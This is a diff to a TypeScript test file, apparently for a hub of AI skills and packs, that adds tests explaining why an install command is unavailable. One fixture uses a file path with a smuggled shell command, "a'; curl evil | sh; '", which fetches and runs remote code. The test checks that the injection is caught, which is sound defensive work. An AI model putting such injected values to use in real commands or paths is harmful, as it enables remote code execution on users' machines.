@@ -5,6 +5,7 @@ import {
   ANNOTATION_EVAL_SCORE_REF,
   ANNOTATION_SOURCE_LOCATION,
   readEvalScore,
+  readInstallUnavailable,
   readHarnesses,
   readInstallCommands,
   isInstallable,
@@ -391,6 +392,20 @@ publish:
       expect(readHarnesses(find(entities, 'AiResource', 's')!)).toEqual(['claude']);
     });
 
+    it('says the path is why when a standalone asset cannot be pasted into a shell', async () => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  skills: skills/*/SKILL.md\n',
+        ),
+        ...repository({
+          "skills/a'; curl evil | sh; '/SKILL.md": '---\ndescription: x\n---\n',
+        }),
+      });
+      expect(readInstallUnavailable(entities[0])).toBe('path');
+    });
+
     it('does not give codex to a loose MCP file inside the pack', async () => {
       // The codex evidence covers servers the pack declares under
       // dependencies.mcp. A file the repository merely publishes from inside
@@ -504,6 +519,35 @@ publish:
       const { system, warnings } = await pack('name: p\ntargets: [claude, brand-new]\n');
       expect(readHarnesses(system)).toEqual(['claude']);
       expect(warnings).toEqual([expect.stringContaining('brand-new')]);
+    });
+
+    describe('why a pack offers no command', () => {
+      const why = async (yaml: string, harnesses = '') => {
+        const { system, skill } = await pack(yaml, harnesses);
+        expect(readInstallUnavailable(skill)).toBe(readInstallUnavailable(system));
+        return readInstallUnavailable(system);
+      };
+
+      it('says the pack declaration is the problem when APM would refuse it', async () => {
+        expect(await why('name: p\ntargets: []\n')).toBe('refused');
+        expect(await why('name: [unclosed\n')).toBe('refused');
+      });
+
+      it('says the repository narrowed it away when only its harnesses list is why', async () => {
+        expect(await why('name: p\ntargets: [cursor]\n', 'harnesses: [claude]\n')).toBe(
+          'narrowed',
+        );
+      });
+
+      it('says the hub does not know the target when that is why', async () => {
+        expect(await why('name: p\ntargets: [not-a-harness]\n')).toBe(
+          'unknown-target',
+        );
+      });
+
+      it('says nothing when there is a command', async () => {
+        expect(await why('name: p\ntargets: [claude]\n')).toBeUndefined();
+      });
     });
 
     it('reports both the unknown target and the pack left with no command', async () => {
